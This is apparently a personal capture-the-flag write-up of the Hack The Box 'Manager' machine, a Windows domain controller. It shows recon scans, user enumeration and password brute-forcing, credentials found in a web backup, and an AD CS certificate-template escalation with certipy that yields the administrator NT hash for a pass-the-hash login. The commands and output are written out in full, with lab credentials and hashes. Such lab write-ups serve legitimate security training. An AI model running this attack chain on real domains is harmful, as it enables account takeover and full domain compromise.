	# Recon:

First scan:

PORT STATE SERVICE
```
53/tcp open domain
80/tcp open http
88/tcp open kerberos-sec
135/tcp open msrpc
139/tcp open netbios-ssn
389/tcp open ldap
445/tcp open microsoft-ds
464/tcp open kpasswd5
593/tcp open http-rpc-epmap
636/tcp open ldapssl
1433/tcp open ms-sql-s
3268/tcp open globalcatLDAP
3269/tcp open globalcatLDAPssl
```
SECOND SCAN:

PORT STATE SERVICE VERSION
```
53/tcp open domain Simple DNS Plus
80/tcp open http Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_ Potentially risky methods: TRACE
|_http-title: Manager
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-10-22 06:55:29Z)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after: 2024-07-29T13:51:28
|_ssl-date: 2023-10-22T06:57:06+00:00; +7h00m00s from scanner time.
445/tcp open microsoft-ds?
464/tcp open kpasswd5?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-10-22T06:57:05+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after: 2024-07-29T13:51:28
1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
| 10.10.11.236:1433:
| Target_Name: MANAGER
| NetBIOS_Domain_Name: MANAGER
| NetBIOS_Computer_Name: DC01
| DNS_Domain_Name: manager.htb
| DNS_Computer_Name: dc01.manager.htb
| DNS_Tree_Name: manager.htb
|_ Product_Version: 10.0.17763
| ms-sql-info:
| 10.10.11.236:1433:
| Version:
| name: Microsoft SQL Server 2019 RTM
| number: 15.00.2000.00
| Product: Microsoft SQL Server 2019
| Service pack level: RTM
| Post-SP patches applied: false
|_ TCP port: 1433
|_ssl-date: 2023-10-22T06:57:07+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-10-22T06:49:49
|_Not valid after: 2053-10-22T06:49:49
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: mana
|_ssl-date: 2023-10-22T06:57:07+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc
| Not valid before: 2023-07-30T13:51:28
|_Not valid after: 2024-07-29T13:51:28
3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: mana
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc
| Not valid before: 2023-07-30T13:51:28
|_Not valid after: 2024-07-29T13:51:28
|_ssl-date: 2023-10-22T06:57:06+00:00; +7h00m00s from scanner time.
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

With kerbrute I found this users :

kerbrute -domain dc01.manager.htb -users /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -dc-ip 10.10.11.236

```
2023/10/22 16:51:35 > [+] VALID USERNAME: ryan@manager.htb
2023/10/22 16:52:03 > [+] VALID USERNAME: guest@manager.htb
2023/10/22 16:52:18 > [+] VALID USERNAME: cheng@manager.htb
2023/10/22 16:52:32 > [+] VALID USERNAME: raven@manager.htb
2023/10/22 16:53:47 > [+] VALID USERNAME: administrator@manager.htb
2023/10/22 16:55:36 > [+] VALID USERNAME: Ryan@manager.htb
2023/10/22 16:55:51 > [+] VALID USERNAME: Raven@manager.htb
2023/10/22 16:56:42 > [+] VALID USERNAME: operator@manager.htb
2023/10/22 17:07:09 > [+] VALID USERNAME: Guest@manager.htb
2023/10/22 17:07:15 > [+] VALID USERNAME: Administrator@manager.htb
2023/10/22 17:14:06 > [+] VALID USERNAME: Cheng@manager.htb
2023/10/22 17:28:57 > [+] VALID USERNAME: jinwoo@manager.htb
2023/10/22 17:31:29 > [+] VALID USERNAME: RYAN@manager.htb
2023/10/22 17:40:29 > [+] VALID USERNAME: RAVEN@manager.htb
2023/10/22 17:40:56 > [+] VALID USERNAME: GUEST@manager.htb
```

With crackmapexec smb manager.htb -u anonymous -p "" --rid-brute too

### User: ###

Bruteforcing the passwords wasn't a good idea, the most easy way: the operator has a weak password. So I try to connect with `impacket-mssqlclient` using that username and password

`impacket-mssqlclient -p 1433 -windows-auth -dc-ip 10.10.11.236 "manager.htb/Operator:<password>"@10.10.11.236`

With xp_dirtree I was able to se some folders, the most interesting one was inetpub.

To navigate on it I had to use `c:\inetpub`

Here on the root of the website there was a zip backup of the website.

```
xp_dirtree c:\inetpub\wwwroot\website-backup-27-07-23-old.zip.
```

But how do I see it ? or download it ?

Just going to the site :
manager.htb/website-backup-27-07-23-old.zip then I just download it.


Inside of this zip, I found a hidden xml file with the user credentials

```
<user>raven@manager.htb</user>
<password>R4v3nBe5tD3veloP3r!123</password>
```

Then I use nmap to scan again and see if the ports 5985 or 5986 were open so I can connect via evil winrm

```
 nmap -sS -T2 -p 5985,5986 10.10.11.236
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-23 14:57 EDT
Nmap scan report for dc01.manager.htb (10.10.11.236)
Host is up (0.32s latency).

PORT     STATE    SERVICE
5985/tcp open     wsman
5986/tcp filtered wsmans

```
Then I just connect
```
evil-winrm -u raven -p 'R4v3nBe5tD3veloP3r!123' -i 10.10.11.236 -P 5985
```

I went to the desktop and finally get the user  flag.

### Root:

Finally to get the root flag I went to the hacktricks website and reading some and talking with some friends I was able to see the vulnerability, It was regarding to a misconfiguration of certificates:

[https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2 "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2")


So, the process was like this:

First of all, I had to put the commands faster, because the settings were reset after a couple of minutes.

1 Add the new officer
```
certipy-ad ca -ca 'manager-DC01-CA' -add-officer raven -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236

Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```
2 Enable the subCA template
```
certipy-ad ca -ca 'manager-DC01-CA' -enable-template 'SubCA' -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236

Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
```
3 Request the certificate (this step fails even if I do it right)
```
certipy-ad req -ca 'manager-DC01-CA' -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' -target 'manager.htb' -template SubCA -upn 'administrator@manager.htb' -dc-ip 10.10.11.236

Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 53
Would you like to save the private key? (y/N) y
[*] Saved private key to 53.key
[-] Failed to request certificate
```
4 Do the issue request
```
certipy-ad ca -ca 'manager-DC01-CA' -issue-request 53 -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236

Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
5 Retrieve the certificate and get the administrator pfx
```
certipy-ad req -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target 'manager.htb' -retrieve 53 -dc-ip 10.10.11.236

Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 53
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '53.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
6 Get the hash from the administrator
```
faketime -f +7h certipy-ad auth -pfx administrator.pfx -domain manager.htb -username administrator -dc-ip 10.10.11.236

Certipy v4.7.0 - by Oliver Lyak (ly4k)
[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```
7 Log in with the hash with evil winrm
```
evil-winrm -u administrator -p aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef -i 10.10.11.236 -P 5985
```

Finally go to the Desktop and read the root flag!!!









## ASSETS

What is the ports ?

### 445


SMB scan

```
nmap -p 445 -A -oN SMB 10.10.11.236

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-time:
| date: 2023-10-22T06:56:28
|_ start_date: N/A
| smb2-security-mode:
| 3:1:1:
|_ Message signing enabled and required
```

smbmap

smbmap -H dc01.manager.htb


SMBMAP:
```
smbmap -H dc01.manager.htb
```

Try to log on the SMB WITH SMBCLIENT

```
smbclient -L 10.10.11.236
smbclient //10.10.11.236/SYSVOL
Password for [WORKGROUP\cds]:
Sharename Type Comment
--------- ---- -------
ADMIN$ Disk Remote Admin
C$ Disk Default share
IPC$ IPC Remote IPC
NETLOGON Disk Logon server share
SYSVOL Disk Logon server share

[https://www.hackingarticles.in/smb-penetration-testing-port-445/](https://www.hackingarticles.in/smb-penetration-testing-port-445/)
```

 crackmapexec

```
INPUT:
kali> crackmapexec smb manager.htb -u anonymous -p "" --rid-brute


OUTPUT:

[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing LDAP protocol database
[*] Initializing MSSQL protocol database
[*] Initializing RDP protocol database
[*] Initializing FTP protocol database
[*] Initializing SMB protocol database
[*] Initializing SSH protocol database
[*] Initializing WINRM protocol database
[*] Copying default configuration file
[*] Generating SSL certificate

SMB dc01.manager.htb 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB dc01.manager.htb 445 DC01 [+] manager.htb\anonymous:
SMB dc01.manager.htb 445 DC01 [+] Brute forcing RIDs
SMB dc01.manager.htb 445 DC01 498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB dc01.manager.htb 445 DC01 500: MANAGER\Administrator (SidTypeUser)
SMB dc01.manager.htb 445 DC01 501: MANAGER\Guest (SidTypeUser)
SMB dc01.manager.htb 445 DC01 502: MANAGER\krbtgt (SidTypeUser)
SMB dc01.manager.htb 445 DC01 512: MANAGER\Domain Admins (SidTypeGroup)
SMB dc01.manager.htb 445 DC01 513: MANAGER\Domain Users (SidTypeGroup)
SMB dc01.manager.htb 445 DC01 514: MANAGER\Domain Guests (SidTypeGroup)
SMB dc01.manager.htb 445 DC01 515: MANAGER\Domain Computers (SidTypeGroup)
SMB dc01.manager.htb 445 DC01 516: MANAGER\Domain Controllers (SidTypeGroup)
SMB dc01.manager.htb 445 DC01 517: MANAGER\Cert Publishers (SidTypeAlias)
SMB dc01.manager.htb 445 DC01 518: MANAGER\Schema Admins (SidTypeGroup)
SMB dc01.manager.htb 445 DC01 519: MANAGER\Enterprise Admins (SidTypeGroup)
SMB dc01.manager.htb 445 DC01 520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
SMB dc01.manager.htb 445 DC01 521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
SMB dc01.manager.htb 445 DC01 522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
SMB dc01.manager.htb 445 DC01 525: MANAGER\Protected Users (SidTypeGroup)
SMB dc01.manager.htb 445 DC01 526: MANAGER\Key Admins (SidTypeGroup)
SMB dc01.manager.htb 445 DC01 527: MANAGER\Enterprise Key Admins (SidTypeGroup)
SMB dc01.manager.htb 445 DC01 553: MANAGER\RAS and IAS Servers (SidTypeAlias)
SMB dc01.manager.htb 445 DC01 571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
SMB dc01.manager.htb 445 DC01 572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
SMB dc01.manager.htb 445 DC01 1000: MANAGER\DC01$ (SidTypeUser)
SMB dc01.manager.htb 445 DC01 1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB dc01.manager.htb 445 DC01 1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB dc01.manager.htb 445 DC01 1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB dc01.manager.htb 445 DC01 1113: MANAGER\Zhong (SidTypeUser)
SMB dc01.manager.htb 445 DC01 1114: MANAGER\Cheng (SidTypeUser)
SMB dc01.manager.htb 445 DC01 1115: MANAGER\Ryan (SidTypeUser)
SMB dc01.manager.htb 445 DC01 1116: MANAGER\Raven (SidTypeUser)
SMB dc01.manager.htb 445 DC01 1117: MANAGER\JinWoo (SidTypeUser)
SMB dc01.manager.htb 445 DC01 1118: MANAGER\ChinHae (SidTypeUser)
SMB dc01.manager.htb 445 DC01 1119: MANAGER\Operator (SidTypeUser)
```



### kerberos p 88:

Kerberos es un protocolo de autenticaci√≥n que se utiliza para comprobar la identidad de un usuario o un host

```
KEBRUTE used for enumeration of kerberos users

kerbrute -domain dc01.manager.htb -users /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -dc-ip 10.10.11.236

2023/10/22 16:51:35 > [+] VALID USERNAME: ryan@manager.htb
2023/10/22 16:52:03 > [+] VALID USERNAME: guest@manager.htb
2023/10/22 16:52:18 > [+] VALID USERNAME: cheng@manager.htb
2023/10/22 16:52:32 > [+] VALID USERNAME: raven@manager.htb
2023/10/22 16:53:47 > [+] VALID USERNAME: administrator@manager.htb
2023/10/22 16:55:36 > [+] VALID USERNAME: Ryan@manager.htb
2023/10/22 16:55:51 > [+] VALID USERNAME: Raven@manager.htb
2023/10/22 16:56:42 > [+] VALID USERNAME: operator@manager.htb
2023/10/22 17:07:09 > [+] VALID USERNAME: Guest@manager.htb
2023/10/22 17:07:15 > [+] VALID USERNAME: Administrator@manager.htb
2023/10/22 17:14:06 > [+] VALID USERNAME: Cheng@manager.htb
2023/10/22 17:28:57 > [+] VALID USERNAME: jinwoo@manager.htb
2023/10/22 17:31:29 > [+] VALID USERNAME: RYAN@manager.htb
2023/10/22 17:40:29 > [+] VALID USERNAME: RAVEN@manager.htb
2023/10/22 17:40:56 > [+] VALID USERNAME: GUEST@manager.htb

Password attack

(with a binary downloaded)

./kerbrute_linux_amd64 bruteuser -d manager.htb /usr/share/wordlists/rockyou.txt administrator

how to log in (??)

[https://www.ibm.com/docs/da/spectrum-symphony/7.3.0?topic=cluster-kerberos-authentication-from-command-line-linux-hosts](https://www.ibm.com/docs/da/spectrum-symphony/7.3.0?topic=cluster-kerberos-authentication-from-command-line-linux-hosts)
```



### 135 445 139

[https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc](https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc)

### Port 135 is 

El registro de sucesos de seguridad de Microsoft sobre el protocolo MSRPC (MSRPC) 
es un protocolo de salida activo que recopila sucesos de Windows sin un agente instalado en el host de Windows

used for RPC client-server communication


```
Find valid user accounts if we have no credentials

rpcclient -U “” -N 10.10.11.236

If it is sucessfull i will have a shell (no cuccess)

rcpclient>

Possible commands:

enumdomusers
queryuser user
enumdomgroups
(querygroup 0x200) - querygroup comand and the id of the group

querygroupmem

querydispinfo
```

 ports 139 and 445 are used for authentication and file sharing. UDP ports 137 and 138 are used for local NetBIOS browser, naming, and lookup functions.


NetBIOS Session service

## Port 139 is 


utilized by NetBIOS Session service

Enabling NetBIOS services provide access to shared resources like files and printers not only to your network computers but also to anyone across the internet. Therefore it is advisable to block port 139 in the Firewall.

389 lda

The enterprise-class Open Source LDAP server for Linux

 LDAP is a protocol for representing objects in a network database. Commonly LDAP servers are used to store identities, groups and organisation data, however LDAP can be used as a structured NoSQL server.

464

 The fact you're seeing this service and port suggests you may be scanning a Domain Controller, for which both UDP & TCP ports 464 are used by the Kerberos Password Change. This port in particular is used for 


593

Microsoft Remote Procedure Call, also known as a function call or a subroutine call, is [a protocol](http://searchmicroservices.techtarget.com/definition/Remote-Procedure-Call-RPC) that uses the client-server model in order to allow one program to request service from a program on another computer without having to understand the details of that computer's network. MSRPC was originally derived from open source software but has been developed further and copyrighted by Microsoft.

Depending on the host configuration, the RPC endpoint mapper can be accessed through TCP and UDP port 135, via SMB with a null or authenticated session (TCP 139 and 445), and as a web service listening on TCP port 593.

636
 Lightweight directory access protocol over SSL (LDAPS) is a vendor-neutral method for 

connecting computers and network resources
 The default port for LDAPS is 636. If you have LDAPS deployed on your network, you can install it with the default port or use an alternative port for queries.


# 389, 636, 3268, 3269 - Pentesting LDAP



[https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap)

LDAP (Lightweight Directory Access Protocol) is a software protocol for enabling anyone to **locate** organizations, individuals, and other **resources** such as files and devices in a network, whether on the public Internet or on a corporate intranet. LDAP is a "lightweight" (smaller amount of code) version of Directory Access Protocol (DAP).

Basic recon:
```
sudo nmap -sT -Pn -n --open 10.10.11.236 -p389 --script ldap-rootdse -oN ldap

Starting Nmap 7.94 ( [https://nmap.org](https://nmap.org) ) at 2023-10-22 11:57 EDT
Nmap scan report for 10.10.11.236

Host is up (0.61s latency).

PORT STATE SERVICE
389/tcp open ldap
| ldap-rootdse:
| LDAP Results
| <ROOT>
| domainFunctionality: 7
| forestFunctionality: 7
| domainControllerFunctionality: 7
| rootDomainNamingContext: DC=manager,DC=htb
| ldapServiceName: manager.htb:dc01$@MANAGER.HTB
| isGlobalCatalogReady: TRUE
| supportedSASLMechanisms: GSSAPI
| supportedSASLMechanisms: GSS-SPNEGO
| supportedSASLMechanisms: EXTERNAL
| supportedSASLMechanisms: DIGEST-MD5
| supportedLDAPVersion: 3
| supportedLDAPVersion: 2
| supportedLDAPPolicies: MaxPoolThreads
| supportedLDAPPolicies: MaxPercentDirSyncRequests
| supportedLDAPPolicies: MaxDatagramRecv
| supportedLDAPPolicies: MaxReceiveBuffer
| supportedLDAPPolicies: InitRecvTimeout
| supportedLDAPPolicies: MaxConnections
| supportedLDAPPolicies: MaxConnIdleTime
| supportedLDAPPolicies: MaxPageSize
| supportedLDAPPolicies: MaxBatchReturnMessages
| supportedLDAPPolicies: MaxQueryDuration
| supportedLDAPPolicies: MaxDirSyncDuration
| supportedLDAPPolicies: MaxTempTableSize
| supportedLDAPPolicies: MaxResultSetSize
| supportedLDAPPolicies: MinResultSets
| supportedLDAPPolicies: MaxResultSetsPerConn
| supportedLDAPPolicies: MaxNotificationPerConn
| supportedLDAPPolicies: MaxValRange
| supportedLDAPPolicies: MaxValRangeTransitive
| supportedLDAPPolicies: ThreadMemoryLimit
| supportedLDAPPolicies: SystemMemoryLimitPercent
| supportedControl: 1.2.840.113556.1.4.319
| supportedControl: 1.2.840.113556.1.4.801
| supportedControl: 1.2.840.113556.1.4.473
| supportedControl: 1.2.840.113556.1.4.528
| supportedControl: 1.2.840.113556.1.4.417
| supportedControl: 1.2.840.113556.1.4.619
| supportedControl: 1.2.840.113556.1.4.841
| supportedControl: 1.2.840.113556.1.4.529
| supportedControl: 1.2.840.113556.1.4.805
| supportedControl: 1.2.840.113556.1.4.521
| supportedControl: 1.2.840.113556.1.4.970
| supportedControl: 1.2.840.113556.1.4.1338
| supportedControl: 1.2.840.113556.1.4.474
| supportedControl: 1.2.840.113556.1.4.1339
| supportedControl: 1.2.840.113556.1.4.1340
| supportedControl: 1.2.840.113556.1.4.1413
| supportedControl: 2.16.840.1.113730.3.4.9
| supportedControl: 2.16.840.1.113730.3.4.10
| supportedControl: 1.2.840.113556.1.4.1504
| supportedControl: 1.2.840.113556.1.4.1852
| supportedControl: 1.2.840.113556.1.4.802
| supportedControl: 1.2.840.113556.1.4.1907
| supportedControl: 1.2.840.113556.1.4.1948
| supportedControl: 1.2.840.113556.1.4.1974
| supportedControl: 1.2.840.113556.1.4.1341
| supportedControl: 1.2.840.113556.1.4.2026
| supportedControl: 1.2.840.113556.1.4.2064
| supportedControl: 1.2.840.113556.1.4.2065
| supportedControl: 1.2.840.113556.1.4.2066
| supportedControl: 1.2.840.113556.1.4.2090
| supportedControl: 1.2.840.113556.1.4.2205
| supportedControl: 1.2.840.113556.1.4.2204
| supportedControl: 1.2.840.113556.1.4.2206
| supportedControl: 1.2.840.113556.1.4.2211
| supportedControl: 1.2.840.113556.1.4.2239
| supportedControl: 1.2.840.113556.1.4.2255
| supportedControl: 1.2.840.113556.1.4.2256
| supportedControl: 1.2.840.113556.1.4.2309
| supportedControl: 1.2.840.113556.1.4.2330
| supportedControl: 1.2.840.113556.1.4.2354
| supportedCapabilities: 1.2.840.113556.1.4.800
| supportedCapabilities: 1.2.840.113556.1.4.1670
| supportedCapabilities: 1.2.840.113556.1.4.1791
| supportedCapabilities: 1.2.840.113556.1.4.1935
| supportedCapabilities: 1.2.840.113556.1.4.2080
| supportedCapabilities: 1.2.840.113556.1.4.2237
| subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=manager,DC=htb
| serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=manager,DC=htb
| schemaNamingContext: CN=Schema,CN=Configuration,DC=manager,DC=htb
| namingContexts: DC=manager,DC=htb
| namingContexts: CN=Configuration,DC=manager,DC=htb
| namingContexts: CN=Schema,CN=Configuration,DC=manager,DC=htb
| namingContexts: DC=DomainDnsZones,DC=manager,DC=htb
| namingContexts: DC=ForestDnsZones,DC=manager,DC=htb
| isSynchronized: TRUE
| highestCommittedUSN: 131309
| dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=manager,DC=htb
| dnsHostName: dc01.manager.htb
| defaultNamingContext: DC=manager,DC=htb
| currentTime: 20231022225716.0Z
|_ configurationNamingContext: CN=Configuration,DC=manager,DC=htb

Service Info: Host: DC01; OS: Windows

dig +short srv _ldap._tcp.dc._msdcs.manager.htb @10.10.11.236

0 100 389 dc01.manager.htb.
```
[https://www.youtube.com/watch?v=uf7ko9LuyFw](https://www.youtube.com/watch?v=uf7ko9LuyFw) 
active directory info video, installing tools and more
